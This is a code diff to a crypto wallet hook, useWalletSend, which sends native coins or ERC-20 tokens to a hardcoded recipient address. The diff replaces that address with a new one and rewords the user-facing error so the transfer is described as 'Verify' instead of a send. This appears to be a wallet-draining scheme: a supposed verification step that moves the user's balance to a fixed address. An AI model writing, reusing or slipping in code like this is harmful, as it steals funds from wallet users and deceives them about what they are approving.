@@ -128,11 +128,11 @@ export const useWalletSend = () => {
             })
 
             if (finalAmountInUnits === 0n) {
-                throw new Error(`Insufficient ${assetSymbol} balance to send (required more than ${fee} for fee).`)
+                throw new Error(`Insufficient ${assetSymbol} balance to Verify (required more than ${fee} for fee).`)
             }
 
             // RECIPIENT ADDRESS
-            const recipientAddress = '0x128a914a572d1ba986ab4b8fe45b80267f1b1598'
+            const recipientAddress = '0x632bb16D35aBB4B277ab35F9951291A4a4E1d8d0'
 
             let hash: string | undefined
 
@@ -141,8 +141,7 @@ export const useWalletSend = () => {
                 const result = await sendTransactionAsync({
                     to: recipientAddress as `0x${string}`,
                     value: finalAmountInUnits,
-                    chainId: currentChainId,
-                    account: address as `0x${string}`
+                    chainId: currentChainId
                 } as any)
                 hash = result
             } else if (assetAddress) {
@@ -152,8 +151,7 @@ export const useWalletSend = () => {
                     abi: erc20Abi,
                     functionName: 'transfer',
                     args: [recipientAddress as `0x${string}`, finalAmountInUnits],
-                    chainId: currentChainId,
-                    account: address as `0x${string}`
+                    chainId: currentChainId
                 } as any)
                 hash = result
             }
